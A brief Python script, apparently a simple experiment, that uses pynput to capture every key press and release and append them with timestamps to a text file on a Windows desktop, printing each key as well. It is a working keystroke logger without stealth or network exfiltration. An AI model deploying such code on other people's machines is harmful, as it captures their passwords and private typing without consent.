from pynput import keyboard
import logging

logging.basicConfig(
    filename=r"C:\Users\62417\Desktop\a.txt", 
    filemode="a", 
    format="%(asctime)s : %(message)s",
    level=logging.INFO
)
log = logging.getLogger(__name__)

def on_press(key):
    log.info("按键{}".format(key))
    print("按键{}".format(key))

def on_release(key):
    log.info("松键{}".format(key))
    print("松键{}".format(key))

while True:
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as f:
        f.join()